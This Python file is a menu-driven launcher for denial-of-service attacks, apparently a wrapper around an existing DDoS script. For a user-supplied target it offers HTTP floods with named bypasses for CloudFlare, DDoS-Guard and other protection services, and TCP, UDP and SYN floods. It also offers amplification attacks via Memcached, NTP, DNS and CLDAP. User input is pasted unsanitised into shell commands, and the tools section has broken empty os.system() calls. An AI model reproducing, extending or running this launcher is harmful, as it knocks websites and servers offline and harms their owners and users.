import os

from colorama import *

import time 



def banner():

    print(f"""



{Fore.RED}███╗   ██╗██╗  ████████╗██████╗ ██████╗  ██████╗ ███████╗

{Fore.GREEN}████╗  ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝

{Fore.MAGENTA}██╔██╗ ██║██║     ██║   ██║  ██║██║  ██║██║   ██║███████╗

{Fore.RED}██║╚██╗██║██║     ██║   ██║  ██║██║  ██║██║   ██║╚════██║

{Fore.CYAN}██║ ╚████║███████╗██║   ██████╔╝██████╔╝╚██████╔╝███████║

{Fore.BLUE}╚═╝  ╚═══╝╚══════╝╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

                                                  

""")

    print(f"""

 {Fore.BLUE}➢      Author: 🌺Nnguyenthanh🌺

 {Fore.GREEN}➢      Co-dev: NguyenDucBaoLam

 {Fore.CYAN}➢      Youtube  : https://youtube.com/@toolnt2k2?si=nRsrTMIMLbjh_H3w

 {Fore.RED}➢      Support  : https://www.facebook.com/nt.14.10.02?mibextid=ZbWKw

 {Fore.CYAN}➢      Website G : https://nguyenthanhstore.id.vn/

""")

def handle_input():

    banner()

    while True:

        inp = input(f'''

{Fore.WHITE}╔════root@gopv2

╚════> ''')

        if inp.lower() == "layer7":

            print(f"""



╔════════════════════════════════════╦════════════════════════════════════════════════════════════════╗

║               Method               ║                          Description                           ║

╠════════════════════════════════════╬════════════════════════════════════════════════════════════════╣

║ get GET                            ║ GET Flood                                                      ║

║ post POST                          ║ POST Flood                                                     ║

║ ovh OVH                            ║ Bypass OVH                                                     ║

║ ovh RHEX                           ║ Random HEX                                                     ║

║ ovh STOMP                          ║ Bypass chk_captcha                                             ║

║ stress STRESS                      ║ Send HTTP Packet With High Byte                                ║

║ dyn DYN                            ║ A New Method With Random SubDomain                             ║

║ downloader DOWNLOADER              ║ A New Method of Reading data slowly                            ║

║ slow SLOW                          ║ Slowloris Old Method of DDoS                                   ║

║ head HEAD                          ║ Mozilla Head method                                            ║

║ null NULL                          ║ Null UserAgent and ...                                         ║

║ cookie COOKIE                      ║ Random Cookie PHP 'if (isset($_COOKIE))'                       ║

║ pps PPS                            ║ Only 'GET / HTTP/1.1        '                                  ║

║ even EVEN                          ║ GET Method with more header                                    ║

║ googleshield GSB                   ║ Google Project Shield Bypass                                   ║

║ DDoSGuard DGB                      ║ DDoS Guard Bypass                                              ║

║ ArvanCloud AVB                     ║ Arvan Cloud Bypass                                             ║

║ Google bot BOT                     ║ Like Google bot                                                ║

║ Apache Webserver APACHE            ║ Apache Expliot                                                 ║

║ wordpress expliot XMLRPC           ║ WP XMLRPC exploit (add /xmlrpc.php)                            ║

║ CloudFlare CFB                     ║ CloudFlare Bypass                                              ║

║ CloudFlare UnderAttack Mode CFBUAM ║ CloudFlare Under Attack Mode Bypass                            ║

║ bypass BYPASS                      ║ Bypass Normal AntiDDoS                                         ║

║ bypass BOMB                        ║ Bypass with codesenberg/bombardier                             ║

║ 🔪 KILLER                          ║ Run many threads to kill a target                              ║

║ 🧅 TOR                             ║ Bypass onion website                                           ║

╚════════════════════════════════════╩════════════════════════════════════════════════════════════════╝



""")

        elif inp.lower() == "layer4":

            print(f"""



╔═══════════════════════╦═══════════════════════════════════════╗

║        Method         ║              Description              ║

╠═══════════════════════╬═══════════════════════════════════════╣

║ tcp TCP               ║ TCP Flood Bypass                      ║

║ udp UDP               ║ UDP Flood Bypass                      ║

║ syn SYN               ║ SYN Flood                             ║

║ cps CPS               ║ Open and close connections with proxy ║

║ icmp ICMP             ║ Icmp echo request flood (Layer3)      ║

║ connection CONNECTION ║ Open connection alive with proxy      ║

║ vse VSE               ║ Send Valve Source Engine Protocol     ║

║ teamspeak 3 TS3       ║ Send Teamspeak 3 Status Ping Protocol ║

║ fivem FIVEM           ║ Send FiveM Status Ping Protocol       ║

║ mem MEM               ║ Memcached Amplification               ║

║ ntp NTP               ║ NTP Amplification                     ║

║ mcbot MCBOT           ║ Minecraft Bot Attack                  ║

║ minecraft MINECRAFT   ║ Minecraft Status Ping Protocol        ║

║ minecraft pe MCPE     ║ Minecraft PE Status Ping Protocol     ║

║ dns DNS               ║ DNS Amplification                     ║

║ chargen CHAR          ║ Chargen Amplification                 ║

║ cldap CLDAP           ║ Cldap Amplification                   ║

║ ard ARD               ║ Apple Remote Desktop Amplification    ║

║ rdp RDP               ║ Remote Desktop Protocol Amplification ║

╚═══════════════════════╩═══════════════════════════════════════╝



""")

        elif inp.lower() == "tools":

            print("""

    CFIP

    DNS

    TSSRV

    PING

    CHECK

    DSTAT""")





    #Layer7 METHOD

        elif inp.lower() == "get":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py GET {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "post":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py POST {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "ovh":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py OVH {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "rhex":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py RHEX {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "stomp":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py STOMP {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "stress":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py STRESS {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "dyn":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py DYN {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "downloader":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py DOWNLOADER {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "slow":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py SLOW {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "head":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py HEAD {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "null":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py NULL {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "cookie":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py COOKIE {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "pps":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py PPS {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "even":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py EVEN {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "gsb":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py GSB {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "dgb":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py DGB {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "avb":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py AVB {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "bot":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py BOT {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "apache":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py APACHE {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "xmlrpc":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py XMLRPC {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "cfb":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CFB {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "cfbuam":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CFBUAM {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "bypass":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py BYPASS {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "bomb":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py BOMB {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "killer":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py KILLER {target} {socks} {threads} proxy.txt 5 {duration}")

        elif inp.lower() == "tor":

            socks = input("Socks:")

            target = input("Target:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py TOR {target} {socks} {threads} proxy.txt 5 {duration}")

    #Layer4 METHOD

        elif inp.lower() == "tcp":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py TCP {ip}:{port} {threads} {duration}")

        elif inp.lower() == "udp":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py UDP {ip}:{port} {threads} {duration}")

        elif inp.lower() == "syn":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py SYN {ip}:{port} {threads} {duration}")

        elif inp.lower() == "cps":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CPS {ip}:{port} {threads} {duration}")

        elif inp.lower() == "icmp":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py ICMP {ip}:{port} {threads} {duration}")

        elif inp.lower() == "connection":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CONNECTION {ip}:{port} {threads} {duration}")

        elif inp.lower() == "vse":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py VSE {ip}:{port} {threads} {duration}")

        elif inp.lower() == "ts3":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py TS3 {ip}:{port} {threads} {duration}")

        elif inp.lower() == "fivem":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py FIVEM {ip}:{port} {threads} {duration}")

        elif inp.lower() == "mem":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py MEM {ip}:{port} {threads} {duration}")

        elif inp.lower() == "ntp":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py NTP {ip}:{port} {threads} {duration}")

        elif inp.lower() == "mcbot":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py MCBOT {ip}:{port} {threads} {duration}")

        elif inp.lower() == "minecraft":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py MINECRAFT {ip}:{port} {threads} {duration}")

        elif inp.lower() == "dns":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py DNS {ip}:{port} {threads} {duration}")

        elif inp.lower() == "char":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CHAR {ip}:{port} {threads} {duration}")

        elif inp.lower() == "cldap":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py CLDAP {ip}:{port} {threads} {duration}")

        elif inp.lower() == "ard":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py ARD {ip}:{port} {threads} {duration}")

        elif inp.lower() == "rdp":

            ip = input("IP address:")

            port = input("Port:")

            duration = input("Duration:")

            threads = input("Threads:")

            os.system(f"python3 start.py RDP {ip}:{port} {threads} {duration}")





    #TOOLS

        elif inp.lower() == "cfip":

            os.system()

        elif inp.lower() == "dns":

            os.system()

        elif inp.lower() == "tssrv":

            os.system()

        elif inp.lower() == "ping":

            os.system()

        elif inp.lower() == "check":

            os.system()

        elif inp.lower() == "dstat":

            os.system()

        else:

            print("There's no command like that!")





try:

    handle_input()

except KeyboardInterrupt:

    time.sleep(0.7)

    print("""

Goodbye, my user!""")

